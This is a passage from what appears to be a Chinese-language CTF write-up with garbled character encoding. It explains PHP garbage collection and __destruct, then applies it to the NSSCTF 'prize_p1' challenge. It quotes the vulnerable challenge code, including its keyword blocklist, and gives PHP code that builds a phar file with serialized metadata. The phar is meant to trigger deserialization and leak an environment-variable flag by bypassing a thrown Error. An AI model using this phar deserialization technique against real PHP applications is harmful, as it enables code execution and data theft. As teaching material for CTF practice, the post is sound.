ÂèØ‰ª•ÈáäÊîæ„ÄÇËøôÊÑèÂë≥ÁùÄÂè™ÊúâÂΩìÂºïÁî®ËÆ°Êï∞ÂèÇÊï∞ÂáèÂ∞ëÂà∞ÈùûÈõ∂ÂÄºÊó∂ÔºåÊâçËÉΩÂàõÂª∫ÂûÉÂúæÂæ™ÁéØ„ÄÇÂÖ∂Ê¨°ÔºåÂú®ÂûÉÂúæÂæ™ÁéØ‰∏≠ÔºåÂèØ‰ª•ÈÄöËøáÊ£ÄÊü•ÊòØÂê¶ÂèØ‰ª•Â∞Ü refcount ÂáèÂ∞ë 1ÔºåÂπ∂Ê£ÄÊü•Âì™‰∫õ    zval ÁöÑ refcount ‰∏∫ 0 Êù•Á°ÆÂÆöÂì™‰∫õÈÉ®ÂàÜÊòØÂûÉÂúæ„ÄÇ</p><h2 id="GCÊú∫Âà∂ÁöÑÂÆûÈôÖÂ∑•‰Ωú"><a href="#GCÊú∫Âà∂ÁöÑÂÆûÈôÖÂ∑•‰Ωú" class="headerlink" title="GCÊú∫Âà∂ÁöÑÂÆûÈôÖÂ∑•‰Ωú"></a>GCÊú∫Âà∂ÁöÑÂÆûÈôÖÂ∑•‰Ωú</h2><p>ÈÇ£‰πàGCÂõûÊî∂Êú∫Âà∂Âú®ctf‰∏≠ËØ•ÊÄé‰πàÂà©Áî®Âë¢Ôºü‰∏äÈù¢ËØ¥Âà∞PHPÁöÑÈ≠îÊúØÊñπÊ≥ï<code>__destruct()</code>ÂáΩÊï∞Âú®Á®ãÂ∫èÁªìÊùüÂêé‰ºöËá™Âä®Ë∞ÉÁî®<code>__destruct()</code>ÂáΩÊï∞ËøõË°åËá™Âä®ÈîÄÊØÅÔºå‰ΩÜÊòØÁ®ãÂ∫èÊä•ÈîôÊàñËÄÖÂºÇÂ∏∏ÁªàÊ≠¢Â∞±‰∏ç‰ºöËß¶ÂèëËØ•ÂáΩÊï∞„ÄÇ</p><p>‰∏ÄÊÆµ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"ÊàëÊòØ__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"ÊàëÊòØ__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Áõ¥Êé•new‰∏Ä‰∏™ÂØπË±°ÂàõÂª∫Á±ªÔºåÂπ∂Ê≤°ÊúâËøõË°åÊåáÂêë</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Á®ãÂ∫èËøêË°åÁªìÊùüÂêé‰ºöÈîÄÊØÅÊâÄÊúâÂØπË±°ÔºåÂ∞±‰ºöËß¶Âèë__destruct();</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/96d1a112806f4e149dede4669e5697b4.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>‰ªéËøêË°åÁöÑÁªìÊûúÂèØ‰ª•ÁúãÂà∞1Â∞±Áõ¥Êé•Ëß¶Âèë<code>__destrcut()ÂáΩÊï∞</code>Ë¢´ÂΩì‰ΩúÂûÉÂúæÁªôÂõûÊî∂‰∫Ü„ÄÇËÄå1Âíå2ÂàôÊòØÂú®ÂàõÂª∫ÂÆå‰πãÂêéÊ≤°ÊúâÊìç‰Ωú‰∫ÜÊâçÊ≠£Â∏∏ÁªìÊùü„ÄÇ</p><p>ÈÇ£‰πàÂ¶ÇÊûúÊ≠£Â∏∏ÊåáÂêëÔºåÁÑ∂ÂêéÂêéÈù¢ÂÜçÊåáÂêëÂØπË±°ÁöÑÊó∂ÂÄôÂøΩÁÑ∂ÊåáÂêëÂÖ∂‰ªñÁöÑÔºåÂ∞±ÊòØËàçÂºÉÂØπË±°ÔºåÈÇ£‰πàÂèà‰ºöÂèëÁîü‰ªÄ‰πàÂë¢Ôºü</p><p>‰∏ÄÊÆµ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">czy</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"ÊàëÊòØ__construct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">.</span><span class="token string double-quoted-string">"ÊàëÊòØ__destruct"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ËàçÂºÉÂØπË±°</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">czy</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/10a042c5408c40bdb0b228566880b9f3.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"><br> ÂØπË±°czyË¢´new‰∫Ü‰πãÂêéÂç¥Ë¢´ËµãÂÄº‰∏∫4Ôºå‰πüÂ∞±ÊòØnew czy(1)ÊâßË°åÊòØNULLÔºåËß¶Âèë<code>__destruct()</code>ÂΩìÊàêÂûÉÂúæË¢´ÂõûÊî∂Ôºå‰πüÂ∞±ÊàêÂäüÊâßË°å‰∫Ü<code>__destruct()</code>ÈáåÁöÑËØ≠Âè•ÔºåËøôÊòØ‰∏Ä‰∏™ÂèØÁî®ÁÇπ„ÄÇ</p><p>Â¶ÇÊûúÊàë‰ª¨Ê≥®ÈáäÊéâ<code>$c[0]=$c[1];//ËàçÂºÉÂØπË±°</code>Ôºö<br> <img src="https://img-blog.csdnimg.cn/f4192d1071814468b09e4daffcbf8377.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>ÊãøÁùÄÂ∞±ÊòØÊ≠£Â∏∏ÂàõÂª∫ÔºåÊ≠£Â∏∏ÈîÄÊØÅ„ÄÇ</p><h2 id="ÁªìÂêàÈ¢òÁõÆ"><a href="#ÁªìÂêàÈ¢òÁõÆ" class="headerlink" title="ÁªìÂêàÈ¢òÁõÆ"></a>ÁªìÂêàÈ¢òÁõÆ</h2><p>ËøôÈáåÊàëÈÄâ‰∫Ü‰∏Ä‰∏™ÊØîËæÉÂÖ∏ÂûãÁöÑÈ¢òÁõÆ<strong>NSSCTF prize_p1</strong><a href="https://www.ctfer.vip/problem/14">È¢òÁõÆÂú∞ÂùÄ</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊàëÁü•ÈÅì‰Ω†ÊÉ≥Âπ≤ÂêóÔºåÊàëÁöÑÂª∫ËÆÆÊòØ‰∏çË¶ÅÈÇ£Ê†∑ÂÅö„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊàëÁü•ÈÅì‰Ω†ÊÉ≥Âπ≤ÂêóÔºåÊàëÁöÑÂª∫ËÆÆÊòØ‰∏çË¶ÅÈÇ£Ê†∑ÂÅö„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊàëÁü•ÈÅì‰Ω†ÊÉ≥Âπ≤ÂêóÔºåÊàëÁöÑÂª∫ËÆÆÊòØ‰∏çË¶ÅÈÇ£Ê†∑ÂÅö„ÄÇ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈÇ£‰πàÂ∞±‰ªéËøôÈáåÂºÄÂßãËµ∑Ëà™Âêß"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flagÂú®ÁéØÂ¢ÉÂèòÈáèÈáå„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÈÇ£‰πàÂ∞±‰ªéËøôÈáåÂºÄÂßãËµ∑Ëà™Âêß"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Ê≥®ÊÑèÂà∞ËøôÈáåÊâîÂá∫ÂºÇÂ∏∏ÔºåÈÇ£Â∞±ÊÉ≥Âà∞‰ªäÂ§©ËÆ≤ÁöÑGCÊú∫Âà∂‰∫Ü„ÄÇ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Âú®È¢òÁõÆÈáå‰πüÁúãÂà∞‰∫Ü</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>‰ª•Âèä<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span>‰∏çÂÖçÊÉ≥Âà∞ËøôÈáå‰ºö‰ΩøÁî®pharÂçèËÆÆpharÂèçÂ∫èÂàóÂåñÂà©Áî®Êù°‰ª∂Ôºö<span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">></span>ÊúâÊñá‰ª∂Êìç‰ΩúÂáΩÊï∞<span class="token punctuation">(</span>file_put_contentsÁ≠âÁ≠â<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator">></span>ÊúçÂä°Á´ØÊúâpharÊñá‰ª∂<span class="token punctuation">(</span>ÂíåÂêéÁºÄÂêçÊó†ÂÖ≥Ôºå‰∏ªË¶ÅÊòØÊ†ºÂºè„ÄÇËøôÈáåÊàë‰ª¨Âà©Áî®<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ÂáΩÊï∞Êù•ÂÜôÂÖ•Êñá‰ª∂<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Â§ßÊ¶ÇÊÄùË∑ØÂ∞±ÊòØÂÖàÂÜôÂÖ•Êñá‰ª∂Âà∞&#x2F;tmp&#x2F;a.txt‰∏≠ÔºåÂÜçÂà©Áî®<strong>pharÂçèËÆÆ</strong>Ëß£Êûê&#x2F;tmp&#x2F;a.txtÊñá‰ª∂ÔºåËß¶Âèë<code>destruct()</code>Ëé∑ÂèñÁéØÂ¢ÉÂèòÈáè‰∏≠ÁöÑflag„ÄÇÁªïËøá<code>throw new Error()</code>ÁöÑÊñπÊ≥ïÂ∞±ÊòØËá™Â∑±Ëß¶ÂèëGCÊú∫Âà∂ÔºåÊèêÂâçËøõÂÖ•<code>__destruct()</code>„ÄÇ</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>Ë¶ÅÁîüÊàêpharÊñá‰ª∂ÁöÑËØùÔºåÂøÖÈ°ªÂú®php.iniÊñá‰ª∂‰∏≠Â∞Üphar.readonlyÈÄâÈ°πËÆæÁΩÆ‰∏∫OffÔºåÂê¶ÂàôÊó†Ê≥ïÁîüÊàêpharÊñá‰ª∂„ÄÇ(ËÆæÁΩÆÊó∂Ê≥®ÊÑèÊääÂâçÈù¢ÂàÜÂè∑Âà†Êéâ)<br> <img src="https://img-blog.csdnimg.cn/c2c224439fdc4c3ea5931ff326460616.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>ÁîüÊàêpharÊñá‰ª∂‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xxx"</span><span class="token operator">.</span><span class="token string double-quoted-string">"xxx&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ËÆæÁΩÆstub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂</span><span class="token comment">//Á≠æÂêçËá™Âä®ËÆ°ÁÆó</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pharÊñá‰ª∂ÊúâÂõõÈÉ®ÂàÜÁªÑÊàêÔºö</p><blockquote><ol><li>a stub</li></ol><p>stubÁöÑÂü∫Êú¨ÁªìÊûÑÔºö**<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>Ôºå**ÂâçÈù¢ÂÜÖÂÆπ‰∏çÈôêÔºå‰ΩÜÂøÖÈ°ª‰ª•<code>__HALT_COMPILER();?&gt;</code>Êù•ÁªìÂ∞æÔºåÂê¶ÂàôpharÊâ©Â±ïÂ∞ÜÊó†Ê≥ïËØÜÂà´Ëøô‰∏™Êñá‰ª∂‰∏∫pharÊñá‰ª∂„ÄÇ</p><p>‚Äã2.a manifest describing the contents</p><p>PharÊñá‰ª∂‰∏≠Ë¢´ÂéãÁº©ÁöÑÊñá‰ª∂ÁöÑ‰∏Ä‰∫õ‰ø°ÊÅØÔºåÂÖ∂‰∏≠Meta-dataÈÉ®ÂàÜÁöÑ‰ø°ÊÅØ‰ºö‰ª•Â∫èÂàóÂåñÁöÑÂΩ¢ÂºèÂÇ®Â≠ò(ÂèØÊéß)ÔºåÂΩìÈÄöËøáphar:&#x2F;&#x2F;ÂçèËÆÆÂØπpharÊñá‰ª∂ËøõË°åÊñá‰ª∂Êìç‰ΩúÊó∂ÔºåÂ∞Ü‰ºöÂØπpharÊñá‰ª∂‰∏≠ÁöÑMeta-dataËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰ΩúËøôÈáåÂ∞±ÊòØÊºèÊ¥ûÂà©Áî®ÁöÑÂÖ≥ÈîÆÁÇπ„ÄÇ</p><p>‚Äã3. the file contents Êñá‰ª∂ÂÜÖÂÆπ</p><p>Ë¢´ÂéãÁº©ÁöÑÊñá‰ª∂ÂÜÖÂÆπÔºåÂú®Ê≤°ÊúâÁâπÊÆäË¶ÅÊ±ÇÁöÑÊÉÖÂÜµ‰∏ãÔºåËøô‰∏™Ë¢´ÂéãÁº©ÁöÑÊñá‰ª∂ÂÜÖÂÆπÂèØ‰ª•Èöè‰æøÂÜôÁöÑÔºåÂõ†‰∏∫Êàë‰ª¨Âà©Áî®Ëøô‰∏™ÊºèÊ¥û‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜËß¶ÂèëÂÆÉÁöÑÂèçÂ∫èÂàóÂåñ„ÄÇ</p><p>‚Äã4.signature Á≠æÂêç</p><p>Ê≥®ÊÑèpharÊñá‰ª∂‰∏çËÉΩ‰ªªÊÑè‰øÆÊîπÔºå‰øÆÊîπ‰πãÂêéÁî±‰∫éÁ≠æÂêçÁöÑÂ≠òÂú®ÔºåÊñá‰ª∂Â∞±‰ºöÂ§±Êïà„ÄÇ</p></blockquote><p>Êü•ÁúãÁîüÊàêÁöÑpharÊñá‰ª∂Ôºö</p><p>pharÁöÑÂèçÂ∫èÂàóÂåñÊ†áÁ≠æÊ†ºÂºè&#x3D;ÂèòÈïøÂ≠óËäÇÊï£ÂàóÂáΩÊï∞ÂÄº+4Â≠óËäÇÊâÄ‰ΩøÁî®Êï£ÂàóÂáΩÊï∞Ê†áÁ≠æÂêç+4Â≠óËäÇÂõ∫ÂÆöÊ†áÁ≠æGBMB</p><p><img src="https://img-blog.csdnimg.cn/21937b33f24b4b75951b683dd0bfadb9.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>Ê†πÊçÆ02 00 00 00ÂèØÁü•ÊòØsha1ËÆ°ÁÆóÁ≠æÂêç<a href="https://www.php.net/manual/zh/phar.fileformat.signature.php">Êñá‰ª∂ÈìæÊé•</a><br> <img src="https://img-blog.csdnimg.cn/745c261c5195453fa2060be5ee60029e.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>Â•Ω‰∫ÜÔºåÁé∞Âú®Ê†πÊçÆÈ¢òÁõÆÁîüÊàê‰∏Ä‰∏™pharÊñá‰ª∂</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">//ËøôÈáåÂêéÁºÄÂøÖÈ°ª‰∏∫phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token comment">//ÂºÄÂßãÂÜôÂÖ•ÂÜÖÂÆπ</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">//pharÊ†áËØÜ</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setmetadata</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//‰∏äÈù¢Êï∞ÁªÑ‰∏≠Á¨¨‰∏Ä‰ΩçÊòØ$a,Á¨¨‰∫å‰ΩçÊòØnull„ÄÇÂ∫èÂàóÂåñÂÜÖÂÆπÔºåËøôÈáåÂÜÖÈÉ®Áõ∏ÂΩì‰∫éË∞ÉÁî®‰∫ÜserializeÂáΩÊï∞</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"czy.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"czy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment">//Ê∑ªÂä†Ë¶Å‰∏ÄËµ∑Âä†ÂÖ•pharÂΩíÊ°£ÁöÑÊñá‰ª∂ÔºàÊñá‰ª∂Âêç+ÂÜÖÂÆπÔºâ</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                              <span class="token comment">//ÂÅúÊ≠¢ÂÜôÂÖ•ÔºåÁ≠æÂêçËá™Âä®ËÆ°ÁÆó</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ÊàêÂäüÁîüÊàêpharÊñá‰ª∂"</span><span class="token punctuation">;</span></span><span aria-hidden="true" 